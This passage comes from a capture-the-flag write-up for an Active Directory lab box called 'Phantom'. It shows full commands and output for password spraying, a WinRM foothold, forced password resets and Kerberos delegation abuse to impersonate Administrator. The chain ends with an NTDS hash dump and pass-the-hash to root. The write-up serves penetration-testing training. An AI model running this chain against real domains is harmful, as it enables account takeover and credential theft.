133:                encrypted-password "$6$rounds=656000$6diBtlKOC2mmpMcP$G.DyFWB.fDoVSEfQN197v8lkGZbj6AI91P39eiNYoF8ymQoK11F.mLuQ6ulUFAxPkYMxVOq.WnkBwzmEWu81H."  
136:        user vyos {  
137:            authentication {  
138:                encrypted-password "$6$rounds=656000$Etl2frgw6IuOffzT$LPX5DjrOKSiVnTjPSLMnVevH4Y4eMf7SEWL6V8eH8GNUSDbFZX7Hj/jFvEGspjAtRY1lLohfGfOiraR1UGiDh."  
139:                plaintext-password ""  
156:        authentication {  
157:            local-users {  
158:                username lstanley {  
159:                    password "gB6XTcqVP5MlP7Rc"
```

We got `encrypted-password "$6$rounds=656000$6diBtlKOC2mmpMcP$G.DyFWB.fDoVSEfQN197v8lkGZbj6AI91P39eiNYoF8ymQoK11F.mLuQ6ulUFAxPkYMxVOq.WnkBwzmEWu81H."` for `admin`, and a plaintext password for lstanley : `gB6XTcqVP5MlP7Rc` as well as another encrypted password for user `vyos` `"$6$rounds=656000$Etl2frgw6IuOffzT$LPX5DjrOKSiVnTjPSLMnVevH4Y4eMf7SEWL6V8eH8GNUSDbFZX7Hj/jFvEGspjAtRY1lLohfGfOiraR1UGiDh."`

We'll first look at the shares lstanley can read and if he can access the directory that was denied to us before in `SYSVOL` :

```bash
>  nxc smb 10.129.234.63 -u lstanley -p 'gB6XTcqVP5MlP7Rc' --shares  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
```

It seems `lstanley` is a local user and doesn't have access to SMB shares at all.

Cracking the Admin or the Vyos hash would take years considering the number of rounds.

This seems like a dead end, but if `lstanley` is the local user (wasn't present in the SMB user list) and we still got a password out of it, might as well spray the password on the list of users we had initially for SMB :

```bash
>  nxc smb 10.129.234.63 -u pusers.txt -p 'gB6XTcqVP5MlP7Rc' --continue-on-success  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [-] phantom.vl\agarcia:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\alucas:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\bbarnes:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ccooper:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\cferguson:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\cjones:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\crose:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ebryant:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\elynch:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\fhanson:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ghall:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ibryant:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\nhamilton:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\pharrison:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\rnichols:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ssimpson:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\ssteward:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc    
SMB         10.129.234.63   445    DC               [-] phantom.vl\twright:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\vcunningham:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\vhoward:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\vlynch:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\wsilva:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE    
SMB         10.129.234.63   445    DC               [-] phantom.vl\wstewart:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
```

And we found the actual user behind `lstanley` :
`[+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc`

We'll try winrm this time first, since the `svc` in the username indicates a shell might be possible.

```bash
>  nxc winrm 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc'  
  
WINRM       10.129.234.63   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)    
WINRM       10.129.234.63   5985   DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc (Pwn3d!)
```

And we can get a shell, finally, foothold.

```PowerShell
>  evil-winrm -i 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> type /Users/svc_sspr/Desktop/user.txt  
c75e****************be39
```

And we got the user flag !

```bash
>  nxc ldap 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc' --users  
LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl) (signing:None) (channel binding:No TLS cert)    
LDAP        10.129.234.63   389    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc    
LDAP        10.129.234.63   389    DC               [*] Enumerated 29 domain users: phantom.vl  
LDAP        10.129.234.63   389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                                  
LDAP        10.129.234.63   389    DC               Administrator                 2025-08-14 15:32:09 0        Built-in account for administering the computer/domain         
LDAP        10.129.234.63   389    DC               Guest                         2024-07-04 16:35:21 0        Built-in account for guest access to the computer/domain       
LDAP        10.129.234.63   389    DC               krbtgt                        2024-07-04 15:15:32 0        Key Distribution Center Service Account                        
LDAP        10.129.234.63   389    DC               svc_sspr                      2024-07-04 15:25:04 2                                                                       
LDAP        10.129.234.63   389    DC               rnichols                      2024-07-04 15:29:01 1                                                                       
LDAP        10.129.234.63   389    DC               pharrison                     2024-07-04 15:29:01 1                                                                       
LDAP        10.129.234.63   389    DC               wsilva                        2024-07-04 15:29:01 1                                                                       
LDAP        10.129.234.63   389    DC               elynch                        2024-07-04 15:29:01 1                                                                       
LDAP        10.129.234.63   389    DC               nhamilton                     2024-07-04 15:29:01 1                                                                       
LDAP        10.129.234.63   389    DC               lstanley                      2024-07-04 15:29:02 1                                                                       
LDAP        10.129.234.63   389    DC               bbarnes                       2024-07-04 15:29:02 1                                                                       
LDAP        10.129.234.63   389    DC               cjones                        2024-07-04 15:29:02 1                                                                       
LDAP        10.129.234.63   389    DC               agarcia                       2024-07-04 15:29:02 1                                                                       
LDAP        10.129.234.63   389    DC               ppayne                        2024-07-04 15:29:02 1                                                                       
LDAP        10.129.234.63   389    DC               ibryant                       2024-07-06 20:15:21 1                                                                       
LDAP        10.129.234.63   389    DC               ssteward                      2024-07-04 15:29:02 1                                                                       
LDAP        10.129.234.63   389    DC               wstewart                      2024-07-04 15:29:02 1                                                                       
LDAP        10.129.234.63   389    DC               vhoward                       2024-07-04 15:29:02 1                                                                       
LDAP        10.129.234.63   389    DC               crose                         2024-07-04 15:29:03 1                                                                       
LDAP        10.129.234.63   389    DC               twright                       2024-07-04 15:29:03 1                                                                       
LDAP        10.129.234.63   389    DC               fhanson                       2024-07-04 15:29:03 1                                                                       
LDAP        10.129.234.63   389    DC               cferguson                     2024-07-04 15:29:03 1                                                                       
LDAP        10.129.234.63   389    DC               alucas                        2024-07-06 12:44:53 1                                                                       
LDAP        10.129.234.63   389    DC               ebryant                       2024-07-04 15:29:03 1                                                                       
LDAP        10.129.234.63   389    DC               vlynch                        2024-07-04 15:29:03 1                                                                       
LDAP        10.129.234.63   389    DC               ghall                         2024-07-04 15:29:03 1                                                                       
LDAP        10.129.234.63   389    DC               ssimpson                      2024-07-04 15:29:03 1                                                                       
LDAP        10.129.234.63   389    DC               ccooper                       2024-07-04 15:29:03 1                                                                       
LDAP        10.129.234.63   389    DC               vcunningham                   2024-07-04 15:29:03 1
```

We can see that the `uname` is `Administrator` and not `ædmin` like on the file we found.

We confirm that on the shell we got as well as the `domain` and `groups` of our foothold user :

```PowerShell
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID                                            Attributes  
=========================================== ================ ============================================== ==================================================  
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group  
PHANTOM\SSPR Service                        Group            S-1-5-21-4029599044-1972224926-2225194048-1137 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> net user svc_sspr /domain  
User name                    svc_sspr  
Full Name                    svc_sspr  
Comment  
User's comment  
Country/region code          000 (System Default)  
Account active               Yes  
Account expires              Never  
  
Password last set            7/4/2024 6:25:04 AM  
Password expires             Never  
Password changeable          7/4/2024 6:25:04 AM  
Password required            Yes  
User may change password     Yes  
  
Workstations allowed         All  
Logon script  
User profile  
Home directory  
Last logon                   Never  
  
Logon hours allowed          All  
  
Local Group Memberships  
Global Group memberships     *SSPR Service         *Domain Users  
The command completed successfully.  
  
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> ls C:\Users\  
  
  
   Directory: C:\Users  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----          7/6/2024  11:55 AM                Administrator  
d-r---          7/3/2024   3:18 AM                Public  
d-----          7/6/2024  11:40 AM                svc_sspr
```

We make a writeable directory to get the bloodhound data :

```bash
>  mkdir -p ~/phantom-bh  
cd ~/phantom-bh  
pwd  
/home/vagabond/phantom-bh  
>  nxc ldap 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc' --bloodhound -c All --dns-server 10.129.234.63  
  
LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl) (signing:None) (channel binding:No TLS cert)    
LDAP        10.129.234.63   389    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc    
LDAP        10.129.234.63   389    DC               Resolved collection methods: session, rdp, trusts, psremote, objectprops, container, group, localadmin, acl, dcom  
LDAP        10.129.234.63   389    DC               Done in 0M 20S  
LDAP        10.129.234.63   389    DC               Compressing output into /home/vagabond/.nxc/logs/DC_10.129.234.63_2026-06-02_005500_bloodhound.zip
```

We copy it and open it in `bloodhound` :

```bash
>  cp ~/.nxc/logs/DC_*bloodhound*.zip ~/phantom-bh/  
ls -lh ~/phantom-bh/*.zip  
-rw-r--r-- 1 vagabond vagabond 213K Jun  2 00:57 /home/vagabond/phantom-bh/DC_10.129.234.63_2026-06-02_005500_bloodhound.zip
```

```bash
>  bloodhound  
To start neo4j: systemctl start neo4j  
(node:29958) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more info  
rmation  
(node:30055) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
```

We can see that `svc_sspr` has outbound `ForceChangePassword` to `crose@phantom.vl, wsilva@phantom.vl` and `rnichols@phantom.vl`.

```bash
>  nxc smb 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc' -M change-password -o USER=wsilva NEWPASS='wsilvapass123!'  
  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc    
CHANGE-P... 10.129.234.63   445    DC               [+] Successfully changed password for wsilva  
>  nxc smb 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc' -M change-password -o USER=rnichols NEWPASS='rnicholspass123!'  
  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc    
CHANGE-P... 10.129.234.63   445    DC               [+] Successfully changed password for rnichols  
>  nxc smb 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc' -M change-password -o USER=crose NEWPASS='crosepass123!'  
  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc    
CHANGE-P... 10.129.234.63   445    DC               [+] Successfully changed password for crose
```

So we have now access to all three users.

```bash
>  nxc smb 10.129.234.63 -u wsilva -p 'wsilvapass123!' --shares  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [+] phantom.vl\wsilva:wsilvapass123!    
SMB         10.129.234.63   445    DC               [*] Enumerated shares  
SMB         10.129.234.63   445    DC               Share           Permissions     Remark  
SMB         10.129.234.63   445    DC               -----           -----------     ------  
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.63   445    DC               C$                              Default share  
SMB         10.129.234.63   445    DC               Departments Share READ               
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.234.63   445    DC               Public          READ               
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share

>  smbclient //10.129.234.63/SYSVOL -U wsilva%wsilvapass123!  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Jul  4 15:14:48 2024  
 ..                                  D        0  Thu Jul  4 15:14:48 2024  
 phantom.vl                         Dr        0  Thu Jul  4 15:14:48 2024  
  
               6127103 blocks of size 4096. 2384021 blocks available  
smb: \> cd phantom.vl  
smb: \phantom.vl\> ls  
 .                                   D        0  Thu Jul  4 15:16:13 2024  
 ..                                  D        0  Thu Jul  4 15:14:48 2024  
 DfsrPrivate                      DHSr        0  Thu Jul  4 15:16:13 2024  
 Policies                            D        0  Thu Jul  4 15:14:55 2024  
 scripts                             D        0  Thu Jul  4 15:14:48 2024  
  
               6127103 blocks of size 4096. 2384021 blocks available  
smb: \phantom.vl\> cd DfsrPrivate  
cd \phantom.vl\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
```

So we still don't have access to this directory, however, we have access to `PUBLIC` :

```bash
>  smbclient //10.129.234.63/Public -U wsilva%wsilvapass123!  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Jul 11 17:03:14 2024  
 ..                                DHS        0  Thu Aug 14 13:55:49 2025  
 tech_support_email.eml              A    14565  Sat Jul  6 18:08:43 2024  
  
               6127103 blocks of size 4096. 2384021 blocks available  
smb: \> get tech_support_email.eml  
getting file \tech_support_email.eml of size 14565 as tech_support_email.eml (36.8 KiloBytes/sec) (average 36.8 KiloBytes/sec)
```

```bash
>  nxc smb 10.129.234.63 -u crose -p 'crosepass123!' --shares  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [+] phantom.vl\crose:crosepass123!    
SMB         10.129.234.63   445    DC               [*] Enumerated shares  
SMB         10.129.234.63   445    DC               Share           Permissions     Remark  
SMB         10.129.234.63   445    DC               -----           -----------     ------  
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.63   445    DC               C$                              Default share  
SMB         10.129.234.63   445    DC               Departments Share READ               
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.234.63   445    DC               Public          READ               
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share    
>  nxc smb 10.129.234.63 -u rnichols -p 'rnicholspass123!' --shares  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [+] phantom.vl\rnichols:rnicholspass123!    
SMB         10.129.234.63   445    DC               [*] Enumerated shares  
SMB         10.129.234.63   445    DC               Share           Permissions     Remark  
SMB         10.129.234.63   445    DC               -----           -----------     ------  
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.63   445    DC               C$                              Default share  
SMB         10.129.234.63   445    DC               Departments Share READ               
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.234.63   445    DC               Public          READ               
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share
```

The two other users have the same share rights.

So, we'll use Impacket for the PrivEsc part :

```bash
>  rbcd.py -delegate-to 'DC$' -delegate-from wsilva -action read phantom.vl/wsilva:'wsilvapass123!' -dc-ip 10.129.234.63  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Accounts allowed to act on behalf of other identity:  
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)  
>  getTGT.py phantom.vl/wsilva:'wsilvapass123!' -dc-ip 10.129.234.63  
cp -f wsilva.ccache wsilva.pre.ccache  
describeTicket.py wsilva.pre.ccache  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Saving ticket in wsilva.ccache  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Number of credentials in cache: 1  
[*] Parsing credential[0]:  
[*] Ticket Session Key            : 47e87a7cc293cb478b3db0f45d8fc256  
[*] User Name                     : wsilva  
[*] User Realm                    : PHANTOM.VL  
[*] Service Name                  : krbtgt/PHANTOM.VL  
[*] Service Realm                 : PHANTOM.VL  
[*] Start Time                    : 02/06/2026 01:24:08 AM  
[*] End Time                      : 02/06/2026 11:24:08 AM  
[*] RenewTill                     : 03/06/2026 01:24:07 AM  
[*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep  
[*] KeyType                       : rc4_hmac  
[*] Base64(key)                   : R+h6fMKTy0eLPbD0XY/CVg==  
[*] Decoding unencrypted data in credential[0]['ticket']:  
[*]   Service Name                : krbtgt/PHANTOM.VL  
[*]   Service Realm               : PHANTOM.VL  
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)  
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

We got `[*] Ticket Session Key : 47e87a7cc293cb478b3db0f45d8fc256

And `[*] Accounts allowed to act on behalf of other identity:  [*] wsilva` which means we can impersonate Administrator using this account.

```bash
>  changepasswd.py -newhashes :47e87a7cc293cb478b3db0f45d8fc256 phantom.vl/wsilva:'wsilvapass123!'@10.129.234.63  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Changing the password of phantom.vl\wsilva  
[*] Connecting to DCE/RPC as phantom.vl\wsilva  
[*] Password was changed successfully.  
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).  
>  export KRB5CCNAME=$PWD/wsilva.pre.ccache  
getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl -dc-ip 10.129.234.63 phantom.vl/wsilva -k -no-pass  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Impersonating Administrator  
[*] Requesting S4U2self+U2U  
[*] Requesting S4U2Proxy  
[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
```

We export the `Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache` and try out netexec :

```bash
>  export KRB5CCNAME=$PWD/Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache  
```

```bash
>  nxc smb 10.129.234.63 -k --use-kcache --ntds --user Administrator  
  
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.63   445    DC               [+] phantom.vl\Administrator from ccache (Pwn3d!)  
SMB         10.129.234.63   445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...  
SMB         10.129.234.63   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd9db4f5984e657f834484512117:::  
SMB         10.129.234.63   445    DC               [+] Dumped 1 NTDS hashes to /home/vagabond/.nxc/logs/ntds/DC_10.129.234.63_2026-06-02_012809.ntds of which 1 were added to the database  
SMB         10.129.234.63   445    DC               [*] To extract only enabled accounts from the output file, run the following command:    
SMB         10.129.234.63   445    DC               [*] grep -iv disabled /home/vagabond/.nxc/logs/ntds/DC_10.129.234.63_2026-06-02_012809.ntds | cut -d ':' -f1
```

We got an NTLM hash, we only take the NT part : `aa2abd9db4f5984e657f834484512117` to use Pass-The-Hash :

```bash
>  evil-winrm -i 10.129.234.63 -u Administrator -H 'aa2abd9db4f5984e657f834484512117'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd /Users/Administrator/Desktop  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt  
fab5f************246b1
```

And we got root on Phantom !
